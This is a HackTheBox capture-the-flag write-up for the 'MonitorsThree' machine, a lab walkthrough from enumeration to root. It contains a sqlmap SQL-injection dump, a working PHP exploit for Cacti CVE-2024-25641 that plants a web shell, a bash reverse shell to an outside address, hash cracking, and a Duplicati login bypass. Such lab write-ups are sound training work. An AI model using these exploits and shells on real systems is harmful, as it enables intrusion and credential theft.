---
title: "Hackthebox: Monitors-Three [Machine] [Season 6]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [Privilege Escalation, Reverse Shell, Nmap, SQLi, Exploitation, (CVE-2024-25641)]
render_with_liquid: false
img_path: /images/hackthebox_monitorthree/
image:
  path: room_image.webp
---

**MonitorsThree** is a Medium HackTheBox machine where we start by enumerating a web server finding an SQLi that leads to data leak for then gaining a reverse shell by exploiting a vulnerability in cacti `(CVE-2024-25641)` , user pivoting by cracking a user’s hash and then exploit a Duplicati web app running locally to gain root access.

## Initial Enumeration

### Nmap Scan

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ nmap -sC -sV 10.129.200.79 -oN monitors.out -T4    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 16:30 CET
Nmap scan report for 10.129.200.79
Host is up (0.084s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds
```

We have identified `2` ports using nmap,

- **22/SSH** - (`open`)
- **80/HTTP** - (`open`)

## Web Server

Having a redirection when accessing the web server, we added a new entry into our `/etc/hosts`.

```console
127.0.0.1       localhost
127.0.1.1       voldemort
10.129.200.79   monitorsthree.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Taking a look at `http://monitorsthree.htb` we get a web app for a networking solutions firm. Looking around we found a login page at `http://monitorsthree.htb/login.php` with a reset password feature, trying some default creds such as admin:admin and root:root won’t be able to help us much so we decided to run an SQLMap on the form and see if it’s vulnerable to SQLi. Capturing a request using Burpsuite we gave it to SQLMap to try some SQLi payloads it didn’t work as intended but trying the same technique on `/forgot_password`.php it worked, the form was vulnerable to SQLi!

> ⚠️As it’s a time-based blind it will take some time to run and retrieve useful information.

![/etc/hosts](01.png){: width="1200" height="800" }

## Sqlmap 

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ sqlmap -r forgot.req -dbms=mysql --dump --dbs --batch                                           
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.5#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:38:35 /2024-08-26/

[16:38:35] [INFO] parsing HTTP request from 'forgot.req'
[16:38:35] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2766 FROM (SELECT(SLEEP(5)))QhIU) AND 'GfJL'='GfJL
---
[16:38:36] [INFO] testing MySQL
[16:38:36] [INFO] confirming MySQL
[16:38:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:38:36] [INFO] fetching database names
[16:38:36] [INFO] fetching number of databases
[16:38:36] [INFO] resumed: 2
[16:38:36] [INFO] resumed: information_schema
[16:38:36] [INFO] resumed: monitorsthree_db
available databases [2]:
[*] information_schema
[*] monitorsthree_db
```

We found a database called `monitorsthree_db`, digging deeper into it using SQLMap we were able to retrieve `4` hashes.

```console
┌──(str4ngerx㉿voldemort)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ cat hashes | sed 's/|//g' | awk '{print $1,":",$2}' | sed 's/ //g' > hashes      
                                                                                                      
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ cat hashes
admin:[REDACTED]
mwatson:[REDACTED]
janderson:[REDACTED]
dthompson:[REDACTED]
```

## Exploitation

### Reverse Shell

Cracking the hashes using hashcat we were able to get the admin’s plain-text password.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ hashcat hashes /usr/share/wordlists/rockyou.txt --username -m 0 --show
admin:31a181c8[REDACTED]:[REDACTED]
```

Using the credentials we got to connect we didn’t find anything useful for us to get a reverse shell.

So we decided to run a subdomain enumeration to fuzz the web server we found 1 subdomain, cacti.

## FUFF

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -fs 13560

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13560
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 112ms]
:: Progress: [19966/19966] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

Adding that to our `/etc/hosts` and having a look at it we get another form, trying the credentials we got earlier we were able to connect.

![/etc/hosts](02.png){: width="1200" height="800" }

Once logged in, we could see the current version of cacti an open-source, web-based network monitoring which is Version `1.2.26` .

![/etc/hosts](03.png){: width="1200" height="800" }

Googline Cacti 1.2.26 exploit we found a [Github Page](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) mentioning an RCE vulnerability with the Import Packages feature as the web app is blindly trusting the filename and the content provided within the XML. Copying the POC provided and tweaking it a bit we got the script that will generate for us the malicious package to upload.

```console
<?php

$xmldata = <<<XML
<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>
XML;

$filedata = "<?php system(\$_GET['cmd']); ?>";
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);

$data = sprintf(
    $xmldata,
    base64_encode($filedata),
    base64_encode($filesignature),
    base64_encode($public_key)
);

openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
$data = str_replace(
    "<signature></signature>",
    "<signature>" . base64_encode($signature) . "</signature>",
    $data
);

file_put_contents("test.xml", $data);
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

So basically the script will create a test.xml.gz file for us that contains the xml script which will then be uploaded with a malicious GET parameter, `<?php system(\$_GET['cmd']); ?>` , that will get the RCE for us.

> ⚠️Note: the script will end up being deleted after a short amount of time so we have to upload and then run the reverse shell command as soon as possible.

Running the script using PHP we get the desired file.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/monitorsthree]
└─$ php exploit.php       
                                                                                                      
┌──(kali㉿kali)-[~/Desktop/HackTheBox/monitorsthree]
└─$ ls
exploit.php  test.xml.gz
```

Going to Import Packages at `http://cacti.monitorsthree.htb/cacti/package_import.php` we select the file we generated and we can see that the file will be uploaded at `/cacti/resource/test.php` , having that in mind, we prepare the URL to GET, `http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.191/9001 0>&1"` . We now need to URL-encode it, `http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=/bin/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.191/9001+0>%261`"

![/etc/hosts](04.png){: width="1200" height="800" }

Setting up a listener and sending that `GET` request we get our reverse shell!

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ nc -lnvp 9001  
listening on [any] 9001 ...
connect to [10.10.14.191] from (UNKNOWN) [10.129.200.79] 42544
bash: cannot set terminal process group (1152): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitorsthree:~/html/cacti/resource$ python3 -c "import pty;pty.spawn('/bin/bash')"
<rce$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@monitorsthree:~/html/cacti/resource$ export TERM=xterm
export TERM=xterm
www-data@monitorsthree:~/html/cacti/resource$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ stty raw -echo; fg             
[1]  + continued  nc -lnvp 9001

www-data@monitorsthree:~/html/cacti/resource$
```
## User Pivoting

Once in we looked for the user on the box and we got 2 active users, `root` and `marcus`.

```console
www-data@monitorsthree:~/html/cacti/resource$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
```

Taking a look at the cacti config file we get the cacti database credentials.


```console
www-data@monitorsthree:~/html/cacti/include$ cat config.php
<?php

[...]

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = '[REDACTED]';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

/**
 * When the cacti server is a remote poller, then these entries point to
 * the main cacti server. Otherwise, these variables have no use and
 * must remain commented out.
 */
 ```

 Looking into the database, we found `marcus` hash.

```console
www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p -D cacti
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 924
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

[...]

MariaDB [cacti]> select username, password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$tjPSsSP6Uo[REDACTED]                                  |
| guest    | $2y$10$SO8woUvjSF[REDACTED]                                  |
| marcus   | $2y$10$Fq8wGXvlM3[REDACTED]                                  |
+----------+--------------------------------------------------------------+
3 rows in set (0.000 sec)
```

Cracking marcus’ hash we were able to retrieve it and connect to the account using.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ john marcus.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ john marcus.hash -show                                       
?:[REDACTED]

1 password hash cracked, 0 left
```
Setting our public key in the account, we were able to get a more stable shell.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ ssh marcus@monitorsthree.htb   
Last login: Tue Aug 20 11:34:00 2024
marcus@monitorsthree:~$ ls
user.txt
marcus@monitorsthree:~$ cat user.txt 
[REDACTED]
```

## Privilege Escalation
Taking a look at the open ports on the machine we get port 8200 open locally.

```console
marcus@monitorsthree:~$ ss -tlnp
State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process        
LISTEN        0             511                        0.0.0.0:80                       0.0.0.0:*                         
LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                         
LISTEN        0             70                       127.0.0.1:3306                     0.0.0.0:*                         
LISTEN        0             4096                 127.0.0.53%lo:53                       0.0.0.0:*                         
LISTEN        0             4096                     127.0.0.1:37299                    0.0.0.0:*                         
LISTEN        0             4096                     127.0.0.1:8200                     0.0.0.0:*                         
LISTEN        0             500                        0.0.0.0:8084                     0.0.0.0:*                         
LISTEN        0             511                           [::]:80                          [::]:*                         
LISTEN        0             128                           [::]:22                          [::]:*
```

Having ssh open we port forwarded 8200 on our local machine in order to investigate it more.

We added the flags `-N` and `-f` to not open a session.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -N -f
```

Curling our localhost on port 8200 we can see that it’s a web server.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ curl -v localhost:8200
* Host localhost:8200 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8200...
* Connected to localhost (::1) port 8200
> GET / HTTP/1.1
> Host: localhost:8200
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Redirect
< location: /login.html
< Date: Mon, 26 Aug 2024 19:27:48 GMT
< Content-Length: 0
< Content-Type: 
< Server: Tiny WebServer
< Connection: close
< Set-Cookie: xsrf-token=kv3U7L4YlbJiZZRHXvWYKzngmmd%2Bt2EzMKdumoIhU28%3D; expires=Mon, 26 Aug 2024 19:37:48 GMT;path=/; 
< 
* Closing connection
```

Taking a look at the web server we got a login pagin for Duplicati a backup client that securely stores encrypted, incremental, compressed remote backups of local files on cloud storage services and remote file servers.

![/etc/hosts](05.png){: width="1200" height="800" }

Googling “`Duplicati Login Bypass`” we found a [Medium Post](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) mentioning a technique to bypass duplicati login.

So here are the steps we’ll be doing, to summerize.

- Retrieving the Server-Passphrase (base64)
- Decrypting it from Base64 then convert it to Hex
- Capturing the Nonce session value
- Setting up the noncedpwd variable in the console and retrieving the outputted value
- URL-encode the outputted value and submit it as the password

So, for the server-passphrase, we can find it in `/opt/duplicati/config/Duplicati-server.sqlite` , running sqlitebrowser on the sqlite file will get us what we need.


![/etc/hosts](06.png){: width="1200" height="800" }

Decypting the server passphrase using `CyberChef` will get as a value that we will save for later.

Capturing the request sent to `http://localhost:8200/login.html`, trying to log in, with burpsuite.

> ⚠️ Note: We need to intercept the response of the request in order to retrive to Nonce session value, right click on the request captured by BurpSuite > Do intercept > Response to this request.

![/etc/hosts](07.png){: width="1200" height="800" }

Now we get our Nonce session value that we need to craft the noncedpwd variable.

![/etc/hosts](08.png){: width="1200" height="800" }

Once the 2 values are in our hands, we start crafting our variable.


```console
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

We need to modify `2` variables in the payload :
- **data.Nonce** : Which is the Nonce we intercepted with burp.
- **saltedpwd** : The hex value we got from Cyberchef.

Intercepting the login attempt, getting the Nonce value from the response, crafting the variable, submiting it into the console, getting the value, replacing it in the request and URL-encoding it will get us in!

> Important Note: All the steps listed above need to be done within the same request as the Nonce session value changes whenever we submit a password to login!

![/etc/hosts](09.png){: width="1200" height="800" }

Once in, we start looking for a way to get shell as root, as Duplicati is a backup web app run by root we could backup our ssh public key and then restore that backup into /root/.ssh as an example and this way we could access the root account through SSH so easily.
So we start by creating a backup (Add backup), setting up a name for the backup and disabling encryption as it won’t be needed, for the Destination, as we said, it will be the root .ssh folder so it will be /source/root/.ssh/ as everyting is under source, moving to Source Data we need to make sure that we create an authorized_keys on the box using marcus account, we make it under `/home/marcus/authorized_keys` so in the Source Data it will be `/source/home/marcus/authorized_keys` we make sure to add the path and click on next, next again and save!

Once all the steps are done and our backup is set, we refresh the page in order to see the created backup.

![/etc/hosts](10.png){: width="1200" height="800" }

We now need to click on the arrow next to our created backup and click on Run now to make the backup. Once done, we need to head to Restore in order to restore the backup files and we need to restore from the backup we just created, for instance, ssh. Selecting ssh and clicking on next we need to select our file that will be restored `(authorized_keys)` and hit on continue, we now need to pick our location as it will be set as `/source/root/.ssh/` as we said earlier and we hit restore!
Now we should be able to login to the root account and retrieve our root.txt file.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
└─$ ssh root@monitorsthree.htb            
Last login: Tue Sep 26 15:21:21 2024
root@monitorsthree:~# ls
root.txt  scripts
root@monitorsthree:~# cat root.txt
fa2a0[REDACTED]
root@monitorsthree:~#
```
CONGRATS YOU CRACK THIS MACHINE❤️
